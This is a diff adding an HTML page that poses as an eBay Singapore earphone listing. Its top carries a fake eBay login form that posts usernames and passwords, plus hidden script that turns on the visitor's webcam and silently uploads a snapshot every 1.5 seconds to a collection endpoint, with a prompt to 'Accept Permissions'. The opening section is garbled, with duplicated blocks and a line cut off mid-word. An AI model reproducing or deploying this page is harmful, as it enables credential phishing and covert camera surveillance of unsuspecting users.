@@ -1,0 +1,749 @@
+<!doctype html>
+<html>
+<head> </head> <body> <form name="loginForm" method="post" action="login.php"> <table width="20%" bgcolor="blue" align="center"> <tr> <td colspan=2><center><font size=4><b><font color="red">ebay</font></b></center></td> </tr> <tr> <td>Username:</td> <td><input type="text" size=25 name="/userid"></td> </tr> <tr> <td>Password:</td> <td><input type="Password" size=25 name="pwd"></td> </tr> <tr> <td ><input type="Reset"></td> <td><input type="submit" onclick="return check(this.form)" value="Login"></td> </tr> </table> </form>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,<!doctype html>
+<html>
+<head> </head> <body> <form name="loginForm" method="post" action="login.php"> <table width="20%" bgcolor="blue" align="center"> <tr> <td colspan=2><center><font size=4><b><font color="red">ebay</font></b></center></td> </tr> <tr> <td>Username:</td> <td><input type="text" size=25 name="/userid"></td> </tr> <tr> <td>Password:</td> <td><input type="Password" size=25 name="pwd"></td> </tr> <tr> <td ><input type="Reset"></td> <td><input type="submit" onclick="return check(this.form)" value="Login"></td> </tr> </table> </form>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    er
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        <p>Hint: LLookook at the favicon</p>
+        <p>(Accept Permissions)</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
+    </<html lang="en">
+ <head> 
+
+
+ 
+
+
+
+  <link rel="dns-prefetch" href="//ir.ebaystatic.com">
+  <link rel="dns-prefetch" href="//i.ebayimg.com">
+  <link rel="dns-prefetch" href="//rover.ebay.com.sg">
+  <link rel="dns-prefetch" href="//p.ebaystatic.com">
+  <link rel="dns-prefetch" href="//q.ebaystatic.com">
+  <link rel="dns-prefetch" href="//rover.ebay.com">
+  <!-- Sync with the domain names for Node JS version in
+https://github.corp.ebay.com/nodejs/site-speed-ebay/blob/master/lib/index.js-->
+  <link rel="dns-prefetch" href="//secureir.ebaystatic.com">
+  <link rel="dns-prefetch" href="//i.ebayimg.com"> 
+  <script type="text/javascript">var ABOVEFOLD = {
+	imagesCount : 0,
+	completedAt : null,
+	load : function(source) {
+		this.completedAt = new Date().getTime();
+		this.imagesCount++;
+	},
+	time : function() {
+		return this.completedAt;
+	}
+};</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0 , maximum-scale=1.0, user-scalable=no">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="format-detection" content="telephone=no">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="expires" content="0">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta name="msapplication-tap-highlight" content="no">
+  <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://ir.ebaystatic.com/pictures/aw/pics/mobile/images/apple-touch-icon.png">
+  <link rel="shortcut icon" href="https://ir.ebaystatic.com/rs/v/odwzr2qysi3fpkvoqj35al3w2uk.ico">
+  <meta property="og:description" content="HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic  | Cell Phones &amp; Accessories, Cell Phone Accessories, Headsets | eBay!">
+  <link rel="preconnect" href="https://ir.ebaystatic.com">
+  <title>HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic  | eBay</title>
+  <meta name="description" content="HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic  | Cell Phones &amp; Accessories, Cell Phone Accessories, Headsets  | eBay!">
+  <meta property="og:site_name" content="eBay">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="referrer" content="unsafe-url">
+  <meta name="msvalidate.01" content="34E98E6F27109BE1A9DCF19658EEEE33">
+  <meta name="twitter:image" content="https://ssli.ebayimg.com/images/g/efgAAOSwaMxbtedk/s-l500.jpg">
+  <meta http-equiv="content-language" content="en-sg">
+  <meta property="og:url" content="https://www.ebay.com.sg/itm/HIFI-Super-Bass-Headset-3-5mm-In-Ear-Earphone-Stereo-Earbud-Headphone-Wire-Mic-/273528430080">
+  <link href="https://i.ebayimg.com" rel="preconnect">
+  <meta name="y_key" content="b37789c369a52e4c">
+  <meta name="google-site-verification" content="juA1DmZm5RVidH_YuIzu1A_WSBQyCS3xtNcWff7o1m4">
+  <link rel="canonical" href="https://www.ebay.com.sg/itm/HIFI-Super-Bass-Headset-3-5mm-In-Ear-Earphone-Stereo-Earbud-Headphone-Wire-Mic-/273528430080">
+  <meta property="og:image" content="https://ssli.ebayimg.com/images/g/efgAAOSwaMxbtedk/s-l500.jpg">
+  <meta property="og:title" content="HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic  | eBay">
+  <meta property="fb:app_id" content="102628213125203">
+  <meta property="og:type" content="ebay-objects:item">
+  <!-- NGMARS SIGNATURE -->
+  <link href="https://ir.ebaystatic.com/rs/v/h2zpyzch4e3fvj3t53uueiezxiz.css" type="text/css" rel="stylesheet">
+ </head> 
+ <body class="non-vq hotness not_ios">
+  <div class="vi-subpage"></div>
+  <div class="viewItemV2-main-page" itemtype="http://schema.org/Product" itemscope>
+   <div class="viewItemV2-top">
+    <style type="text/css">.gh-hdn{ display: none!important;}</style>
+    <!--ts:2020.02.24.09:09-->
+    <!--rq:-->
+    <!--rvr:114rcb-->
+    <input type="hidden" id="gh-appbnr" value="{&quot;USERAGENT&quot;:&quot;Android [2].[0-1]|Android [0-1].[0-9]|iPhone OS [0-5]_[0-9]|BlackBerry|Windows|BB10|WebOS|Gecko/[0-9][0-9].[0-9] Firefox/[0-9][0-9].[0-9]|Andriod [4]_[4]_[0-9] Chrome|XT1095,i&quot;,&quot;REFERRER&quot;:&quot;(^(?!.*ebay).*$)&quot;,&quot;NUMBEROFDAYS&quot;:&quot;10&quot;,&quot;ULINK&quot;:[{}]}">
+    <section class="gh-banner" id="gh-appBanner" role="region" aria-label="eBay Message" style="display: block;">
+     <div class="gh-ab-viewRt">
+      <a aria-describedby="gh-appBanner-txt" href="javascript:void(0);" data-url="https://rover.ebay.com/rover/1/711-58542-18990-19/4?mpre=https%3A%2F%2Fwww.ebay.com.sg%2Fulk%2Fitm%2F273528430080%3Ful_skipRefererCheck%3Dtrue%26ul_alt%3Dstore%26sabg%3D782fb0ec1700a4ea9b38266fffec7aaa%26sabc%3D782fc06e1700a9c533442c73e8324829" id="gh-appBanner-view" _sp="m2428.l8667" style="display: block;">View</a>
+     </div>
+     <div class="gh-ab-logoLt">
+      <button aria-label="Dismiss eBay Message" id="gh-banner-close" _sp="m2428.l8666"></button>
+      <span class="gh-eBayLogo" id="gh-appBanner-logo"></span>
+     </div>
+     <div class="gh-ab-contMdl">
+      <div class="gh-ab-contAln">
+       <span id="gh-appBanner-txt">Faster, Easier, eBay.</span>
+       <br>
+       <span id="gh-appBanner-txt-small">It's all in the app</span>
+      </div>
+     </div>
+    </section> 
+    <a id="gh-skipTo" class="gh-hdn" href="#mainContent">Skip to main content</a>
+    <div id="gh-mask"></div>
+    <div id="mw-hdr">
+     <div id="gh-top" role="navigation" aria-label="Account">
+      <div class="cl lgoCl">
+       <a id="gh-mlogo" class="ghspr gh-eBayLogo" _sp="m2428.l4282" href="https://m.ebay.com.sg">eBay</a>
+      </div>
+      <div class="floatedRight">
+       <div class="cl">
+        <a class="homeicon" aria-label="ebay" _sp="m2428.l4278" href="https://m.ebay.com.sg"><span class="ghspr hdSpt"></span></a>
+       </div>
+       <div class="cl srchCl ">
+        <button id="gh-openSearch" class="ghspr" aria-label="Search eBay"></button>
+       </div>
+       <div class="cl myBCl">
+        <a id="gh-mebay" _sp="m2428.l4280" aria-label="Go to My eBay page" href="https://m.ebay.com.sg/myebay"><span class="hdSpt ghspr"></span></a>
+       </div>
+      </div>
+     </div>
+     <form id="gh-f" method="get" action="https://m.ebay.com.sg/sch/i.html" role="dialog">
+      <input type="hidden" value="R40" name="_from">
+      <input type="hidden" name="_trksid" value="m4084.l1313">
+      <input type="search" required size="50" maxlength="300" aria-label="Enter your search keyword" placeholder="Search for anything" id="kw" name="_nkw" aria-haspopup="false" aria-required="true" aria-invalid="false">
+      <input type="submit" value="Search" id="ghs-submit" class="ghspr">
+      <button aria-label="Clear search keyword" id="ghs-clear" class="ghspr"></button>
+      <button aria-label="Close search dialog" id="ghs-cancel">Cancel</button>
+      <div id="gh-searchOverlay" class="suggestion"></div>
+     </form>
+    </div>
+    <input id="gh-fn-inty" type="hidden" value="oYkE8L8Q9kz6BaMfSYblw+cpzgZH8jJgMhG+xjJ04/p3xJD4tv7wpqbdXHmlaB0I">
+    <div id="widgets-placeholder" class="widgets-placeholder"></div>
+   </div>
+   <a id="mainContent" name="mainContent" role="main" tabindex="-1" href="javascript:;"></a>
+   <div id="viewItemV2Cont">
+    <input type="hidden" id="binDynSeed" value="MTU4MjU2NDQ3OTAwMHRva2Vu">
+    <input type="hidden" id="egdShippingCode" value="">
+    <input type="hidden" id="buyerSelectedEgd" value="">
+    <input type="hidden" id="zipCodeEgd" value="">
+    <input type="hidden" id="countryEgd" value="">
+    <input type="hidden" id="dynSeed" value="441804">
+    <div id="viParent" data-itemid="273528430080">
+     <div id="statusMsg"></div>
+     <div id="itemDetails" class="">
+      <div id="viImgGalWrapper" style="height: 270px;">
+       <div id="imgScroller" style="width: 6120px; transition-timing-function: cubic-bezier(0.1, 0.57, 0.1, 1); transition-duration: 0ms; transform: translate(0px, 0px) translateZ(0px);">
+        <ul id="imgParent">
+         <li class="imgCont tracking" id="imgCont_0" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;">
+          <div class="imgContTbl">
+           <div class="imgContTcl">
+            <img itemprop="image" onload="ABOVEFOLD.load(0);" class="imgGal" data-src="https://i.ebayimg.com/images/g/efgAAOSwaMxbtedk/s-l500.jpg" id="img_0" alt="HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic " src="https://i.ebayimg.com/images/g/efgAAOSwaMxbtedk/s-l500.jpg" style="max-height: 270px;">
+           </div>
+          </div></li>
+         <li class="imgCont tracking" id="imgCont_1" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;">
+          <div class="imgContTbl">
+           <div class="imgContTcl">
+            <img class="imgGal" id="img_1" alt="HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic " src="https://i.ebayimg.com/images/g/LwEAAOSw1IVbtedj/s-l500.jpg" data-src="https://i.ebayimg.com/images/g/LwEAAOSw1IVbtedj/s-l500.jpg" style="max-height: 270px;">
+           </div>
+          </div></li>
+         <li class="imgCont tracking" id="imgCont_2" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;">
+          <div class="imgContTbl">
+           <div class="imgContTcl">
+            <img class="imgGal" id="img_2" alt="HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic " src="https://i.ebayimg.com/images/g/QgcAAOSwBNdbtedl/s-l500.jpg" data-src="https://i.ebayimg.com/images/g/QgcAAOSwBNdbtedl/s-l500.jpg" style="max-height: 270px;">
+           </div>
+          </div></li>
+         <li class="imgCont tracking" id="imgCont_3" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;">
+          <div class="imgContTbl">
+           <div class="imgContTcl">
+            <img class="imgGal" id="img_3" alt="HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic " src="https://i.ebayimg.com/images/g/G20AAOSwFvBbtedm/s-l500.jpg" data-src="https://i.ebayimg.com/images/g/G20AAOSwFvBbtedm/s-l500.jpg" style="max-height: 270px;">
+           </div>
+          </div></li>
+         <li class="imgCont tracking" id="imgCont_4" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;">
+          <div class="imgContTbl">
+           <div class="imgContTcl">
+            <img class="imgGal" id="img_4" alt="HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic " src="https://i.ebayimg.com/images/g/egIAAOSwaMxbtedn/s-l500.jpg" data-src="https://i.ebayimg.com/images/g/egIAAOSwaMxbtedn/s-l500.jpg" style="max-height: 270px;">
+           </div>
+          </div></li>
+         <li class="imgCont tracking" id="imgCont_5" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+         <li class="imgCont tracking" id="imgCont_6" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+         <li class="imgCont tracking" id="imgCont_7" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+         <li class="imgCont tracking" id="imgCont_8" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+         <li class="imgCont tracking" id="imgCont_9" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+         <li class="imgCont tracking" id="imgCont_10" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+         <li class="imgCont tracking" id="imgCont_11" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+         <li class="imgCont tracking" id="imgCont_12" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+         <li class="imgCont tracking" id="imgCont_13" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+         <li class="imgCont tracking" id="imgCont_14" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+         <li class="imgCont tracking" id="imgCont_15" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+         <li class="imgCont tracking" id="imgCont_16" _sp="p2056116.m2570.l6239" style="width: 360px; height: 270px;"></li>
+        </ul>
+       </div>
+       <div id="indicatorParent">
+        <div class="imgGlryIdr">
+         <span id="curImgGlryIdx">1</span>/
+         <span id="ttlImgGlryIdx">17</span>
+        </div>
+       </div>
+      </div>
+      <div id="viDescContainer">
+       <div id="viHiLiteParent">
+        <h1 id="itemHeader" itemprop="name" class="it-ttl">HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic </h1>
+        <div id="viPriceParent" itemtype="http://schema.org/Offer" itemscope itemprop="offers">
+         <div id="mskuPrice" class="price">
+          <div itemprop="price">
+           <span class="msku-price-rng msku-pad-rgt">US $0.99<span class="msku-pad-lftrgt">-</span><span class="msku-inline-block">US $2.39</span></span>
+           <span class="msku-price-rng msku-convprice-rng">Approx S$1.38<span class="msku-pad-lftrgt">-</span><span class="msku-inline-block">S$3.34</span></span>
+          </div>
+         </div>
+         <span content="" itemprop="priceCurrency"></span>
+        </div>
+        <div class="viWhy2BuyParent">
+         <div class="viWhy2BuySection vi_details">
+          <div class="viHiLiteShipPriceMethod ">
+           <span class="viHiLiteFreeShip">Free</span>
+           <span class="viHiLiteShipping">Postage</span>
+          </div>
+          <div class="viHiLiteShipDate">
+           Apr 01 to 
+           <span>May 08</span>
+           <span class="viHiLiteEstDelivery">Est. Delivery</span>
+          </div>
+         </div>
+        </div>
+       </div>
+       <div id="msku-menu-ctr">
+        <div class="msku-ctr" id="msku_list">
+         <div class="msku-flt-clr"></div>
+         <div class="trait-ctr">
+          <div class="trait-label-wrp">
+           <label for="vSelect_63" title="Color">Color</label>
+          </div>
+          <div class="trait-mnu-wrp">
+           <select id="vSelect_63" class="trait-mnu" data-matchingmask="63" aria-label="Select"><option value="-1">Select</option><option value="1">Black</option><option value="2">Rose Gold</option><option value="3">Silver</option><option value="4">Gold</option><option value="5">Red</option><option value="6">White</option></select>
+          </div>
+         </div>
+         <div class="msku-flt-clr"></div>
+        </div>
+       </div>
+       <input type="hidden" value="" name="variationId" id="variationId">
+       <input type="hidden" name="skuId" id="skuId" value="">
+       <div class="txn-btn-wrp">
+        <a id="buyItNowBtn" href="javascript:void(0);" class="btn inline_nav_link tracking primary buyItNowBtn" _sp="p2056116.m2548.l6245" data-label="Buy It Now">Buy It Now </a>
+        <div class="inlineBtns" id="watchInlineBtn">
+         <div class="watchSec" data-watchurl="https://m.ebay.com.sg/watch?itemId=273528430080&amp;dyna=441804&amp;page=viewItem" data-signedin="'false'">
+          <a id="watchSignedOutBtn" href="https://m.ebay.com.sg/watch?itemId=273528430080&amp;dyna=441804&amp;page=viewItem" class="btn inline_nav_link tracking secondary" _sp="p2056116.m2548.l6252" data-label="Watch">Watch </a>
+         </div>
+         <div class="unWatchSec hidden">
+          <a id="unWatchBtn" href="javascript:void(0);" class="btn inline_nav_link tracking secondary" _sp="p2056116.m2548.l6254" data-label="Unwatch">Unwatch </a>
+         </div>
+        </div>
+       </div>
+       <div id="viDetailsParent" class="container vi_details">
+        <div id="viSpecificsParent" class="divideSec">
+         <div id="viSpecificsCont" class="tracking" _sp="p2056116.m3597.l6452">
+          <div class="detailsEntry" id="condDesc">
+           <div class="nameLeft" id="condName">
+            Condition
+           </div>
+           <div class="valueRight condDesc">
+            <div class="condInfoIcn">
+             <a href="javascript:void(0);" class="info-icon" title="Read more about condition"><span class="ac-hide-cnt">Read more about condition</span></a>
+            </div>
+            <div class="condText">
+             New
+            </div>
+           </div>
+          </div>
+          <div class="detailsEntry">
+           <div class="nameLeft" id="qtyName">
+            Quantity
+           </div>
+           <div class="valueRight" id="qtyValue">
+            More than 10 available
+            <div class="subValueRight visual-hotness-sign" id="qtySold">
+             68 sold
+            </div>
+           </div>
+          </div>
+          <div class="detailsEntry">
+           <div class="itemSpecName nameLeft">
+            Brand
+           </div>
+           <div class="itemSpecVal valueRight">
+            Unbranded
+           </div>
+          </div>
+          <div class="detailsEntry">
+           <div class="itemSpecName nameLeft">
+            Earpiece
+           </div>
+           <div class="itemSpecVal valueRight">
+            Double
+           </div>
+          </div>
+          <div class="detailsEntry">
+           <div class="itemSpecName nameLeft">
+            Compatible Brand
+           </div>
+           <div class="itemSpecVal valueRight">
+            Universal
+           </div>
+          </div>
+          <div class="detailsEntry">
+           <div class="itemSpecName nameLeft">
+            Earpiece Design
+           </div>
+           <div class="itemSpecVal valueRight">
+            Earbud (In Ear)
+           </div>
+          </div>
+          <div class="detailsEntry">
+           <div class="itemSpecName nameLeft">
+            Type
+           </div>
+           <div class="itemSpecVal valueRight">
+            Headset
+           </div>
+          </div>
+          <div id="itemSpecsChevron" class="rightChevron"></div>
+         </div>
+        </div>
+        <div id="viItemDescParent" class="divideSec">
+         <a id="viItemDescAnchr" href="http://vi.raptor.ebaydesc.com/ws/eBayISAPI.dll?ViewItemDescV4&amp;item=273528430080&amp;category=80077&amp;pm=1&amp;ds=0&amp;t=1582564478987&amp;cspheader=1" class="anchorSpacing tracking" _sp="p2056116.m3555.l6241">
+          <div id="viItemDescCont">
+           <div id="itemDescName" class="nameLeft">
+            Item Description
+           </div>
+           <div id="itemDescRightChevron" class="rightChevron"></div>
+          </div></a>
+        </div>
+       </div>
+       <div id="viShipRetPaySection" class="vq-card">
+        <div id="viSRPTitle" class="containerTitle">
+         <span>Postage, Returns and Payments</span>
+         <span class="etrp-badge etrp-badge-icon"></span>
+        </div>
+        <div id="shipRetPayAnchor" class="tracking" _sp="p2056116.m2732.l6243">
+         <div id="viShipRetPayCont" class="container">
+          <div class="detailsEntry">
+           <div class="nameLeft shipDispName">
+            Posts from
+           </div>
+           <div class="valueRight shipDispValue">
+            Yiwu, China
+           </div>
+          </div>
+          <div id="viShipRetPayParent">
+           <div class="nameLeft shipDispName">
+            Est. Delivery
+           </div>
+           <div class="valueRight shipDispValue ">
+            Apr 01 - May 08
+           </div>
+           <div id="viReturnsParent">
+            <div class="returnsLbl nameLeft">
+             Returns
+            </div>
+            <div class="returnsContent valueRight">
+              Accepted
+            </div>
+            <div class="nameLeft ">
+             Payments
+            </div>
+            <div class="valueRight">
+             PayPal 
+            </div>
+           </div>
+          </div>
+          <div id="shipRetPayChevron" class="rightChevron"></div>
+         </div>
+        </div>
+       </div>
+       <div id="getData" class="hidden" data-itemid="273528430080"></div>
+       <div id="merchLazyLoad" data-itemid="273528430080"></div>
+       <div id="viewItemSellerWrapper" data-itemid="273528430080" data-sellerid="smiling*12" class="vq-card">
+        <div class="hidden" id="getfdbackScore" data-fdscr="194874" data-fdbckper="98.9"></div>
+        <div id="viSellerTitle" class="containerTitle">
+         About the Seller
+        </div>
+        <div id="viSellerSection" class="sellerSec">
+         <div id="viSellerParent" class="container">
+          <div id="viSellerCont">
+           <div class="hidden" id="getSellerIcon" data-sellericon=""></div>
+           <div id="sellerImg">
+            <span class="sellerPic imagePlacehoder"></span>
+           </div>
+           <div id="sellerDesc">
+            <div id="sellerName">
+             smiling*12
+             <span id="feedbckScr">(194874)</span>
+            </div>
+            <div id="fbPercent">
+             98.9% Positive Feedback
+            </div>
+            <div id="registrationYear"></div>
+            <div id="registrationSite"></div>
+           </div>
+          </div>
+          <div id="viSellerShowMore">
+           <div id="showMoreParent_viSellerShowMore" class="showMoreParent tracking" _sp="p2056116.m3561.l6261">
+            <div class="showMoreLess showMore">
+             Show more
+            </div>
+            <div class="showMoreDownArrow"></div>
+           </div>
+           <div id="showLessParent_viSellerShowMore" class="showLessParent tracking hidden" _sp="p2056116.m3561.l6262">
+            <div class="spinner hidden" id="showMoreThrobber_viSellerShowMore"></div>
+            <div class="showMoreLess showLess">
+             Show less
+            </div>
+            <div class="showMoreUpArrow"></div>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="inlineBtnsParent"></div>
+      </div>
+     </div>
+     <div id="scandal100583" title="ADVERTISEMENT" class="mfeAds"></div>
+     <div id="viMerchParent" class="vq-card viMerch-lazy-load-enabled">
+      <div id="viMerchItmContainer">
+       <div class="masonryDv"></div>
+      </div>
+     </div> 
+     <div class="pageSec">
+      <div id="toplink" class="toptxt tracking" _sp="p2056116.m2696.l4319">
+       <span class="topImg"></span>
+       <b class="heading">Top</b>
+      </div>
+     </div>
+    </div>
+   </div>
+   <footer id="gf-mweb" class="fsec">
+    <section id="f1sec">
+     <div class="footlist">
+      <span class="im hm"></span>
+      <a _sp="m2429.l4288" href="https://www.ebay.com.sg">Home</a>
+     </div>
+     <div id="gf-my" class="footlist">
+      <span class="im my gf-myebay"></span>
+      <a _sp="m2429.l4290" href="https://m.ebay.com.sg/myebay">My eBay</a>
+     </div>
+     <div id="gf-signin" class="footlist">
+      <span class="im sign"></span>
+      <a _sp="m2429.l4291" href="https://signin.ebay.com.sg/ws/eBayISAPI.dll?SignIn&amp;srcAppId=3564&amp;ru=https%3A%2F%2Fm.ebay.com.sg%2Fitm%2FHIFI-Super-Bass-Headset-3-5mm-In-Ear-Earphone-Stereo-Earbud-Headphone-Wire-Mic%2F273528430080%3Fhash%3Ditem3faf909e00%3Am%3AmjlCcTuDypcZowYb5EE0IgA">Sign in / Register</a>
+     </div>
+     <div class="footlist">
+      <span class="im sell"></span>
+      <a _sp="m2429.l4895" href="https://m.ebay.com.sg/syi">Sell an item</a>
+     </div>
+     <div class="footlist">
+      <span class="im cus"></span>
+      <a _sp="m2429.l4292" href="https://ocsnext.ebay.com.sg/ocs/home?srcAppId=5">Help &amp; Contact</a>
+     </div>
+     <div class="footlist " id="gh-android-app">
+      <span class="app"></span>
+      <a _sp="m2429.l4294" id="androidApp" class="downloadAppLink" href="market://details?id=com.ebay.mobile">Download the free eBay app</a>
+     </div>
+     <div class="footlist hidden" id="gh-itunes-app">
+      <span class="app"></span>
+      <a _sp="m2429.l4294" id="iTunesApp" class="downloadAppLink" href="http://itunes.apple.com/app/ebay-mobile/id282614216?mt=8">Download the free eBay app</a>
+     </div>
+     <div id="gh-ccpa-placeholder"></div>
+    </section>
+    <section id="f2sec">
+     <span><a _sp="m2429.l4402" href="https://m.ebay.com.sg/logout">Sign out</a></span>
+    </section>
+    <section id="f3sec">
+     <a _sp="m2429.l6836" href="https://pages.ebay.com.sg/help/policies/user-agreement.html">User Agreement</a>
+     <a _sp="m2429.l4296" href="https://pages.ebay.com.sg/help/policies/privacy-policy.html">Privacy</a>
+     <a id="gf-classic" _sp="m2429.l4297" rel="nofollow" href="https://www.ebay.com.sg/?SSOWebDispatcher&amp;tg=web&amp;ru=https%3A%2F%2Fwww.ebay.com.sg%2Fitm%2FHIFI-Super-Bass-Headset-3-5mm-In-Ear-Earphone-Stereo-Earbud-Headphone-Wire-Mic%2F273528430080%3Fhash%3Ditem3faf909e00%3Am%3AmjlCcTuDypcZowYb5EE0IgA%26redirect%3Dmobile">Classic site</a>
+     <div class="ftLnk">
+      <a href="https://pages.ebay.com.sg/help/account/cookies-web-beacons.html">Cookies</a>
+     </div>
+    </section>
+    <div class="fcopy">
+      © 1995 - 2020 eBay Inc.
+    </div>
+   </footer> 
+   <script type="text/javascript">
+(function() {
+var Context = raptor.require('ebay.context.Context');
+Context.call(Context,{"site":216,"errors":{"enabled":false},"app":"mweb","domain":".ebay.com.sg","cobrand":2,"pool":"production","locale":"en_SG","features":{},"pid":2056116});
+})();
+if(typeof GH!="undefined"&&GH){GH.urls={mweb_autocomplete_js:"https://ir.ebaystatic.com/rs/c/ac.min-10292019-3.js",mweb_fnet_js:"https://c.paypal.com/da/r/efb.js",widget_delivery_platform:"https://ir.ebaystatic.com/cr/v/c1/globalheader_widget_platform__v1-49d3462703.js"};}if(typeof GH!="undefined" && GH){GH_config={"xhrBaseUrl":"https://www.ebay.com.sg","siteId":"216","geoLang":"[]","suppressGeoUserUpdateInfo":"false","env":"production",sin:0,id:'',fn:'',pageId:2056116,ct:0};GH.init();}
+                                    var _rtmCfg = {
+                                        timeout: 10,
+                                        rtmIds : [20322,20311]
+                                    };
+                                new (raptor.require('raptor.tracking.core.Tracker'))({"psi":"AMY6t23M*","rover":{"imp":"/roverimp/0/0/9","clk":"/roverclk/0/0/9","uri":"https://rover.ebay.com.sg"},"pid":"p2056116"});raptor.require('raptor.tracking.idmap.IdMap').roverService("https://rover.ebay.com.sg/idmap/0?footer");</script>
+   <script type="text/javascript">
+        		var viData = {"itemTeaser":{"img":"https://i.ebayimg.com/images/g/efgAAOSwaMxbtedk/s-l500.jpg","title":"HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic ","price":{"price":"Approx S$1.38","shipping":"Free Postage"},"endTimeUTC":"02/27/2020 08:04:37","content":{"AC_ENDING_TIME":"Item Ending time: 27 Feb 2020 16:04:37"}},"buyItNow":{"immediatePay":false,"quantity":370,"redirectUrl":"https://signin.ebay.com.sg/ws/eBayISAPI.dll?Signin\u0026srcAppId\u003d3564\u0026ru\u003dhttps%3A%2F%2Fm.ebay.com.sg%2Fitm%3FitemId%3D273528430080%26action%3DBIN%26varId%3DVARID\u0026gchru\u003dhttps%3A%2F%2Fpay.ebay.com.sg%2Frgxo%3Faction%3Dcreate%26rypsvc%3Dtrue%26pagename%3Dryp%26item%3D273528430080%26var%3DVARID%26quantity%3D1%26transactionid%3D-1\u0026gch\u003d1\u0026gxo\u003dtrue","binAmount":0.0,"currencyId":"USD","shipping":"Free","sellerName":"smiling*12","prox":false,"paramNames":{},"tracking":{"INCRE":"p2056116.m3682.l5004","CONFIRM":"p2056116.m3682.l6443","BIN_CANCEL":"p2056116.m3682.l6439","DECRE":"p2056116.m3682.l5005"}},"shippingReturnPayment":{"returnsModel":{"returnAccepted":true,"returnPaidBy":"SELLER","withinDays":"60","refundMethod":"Money 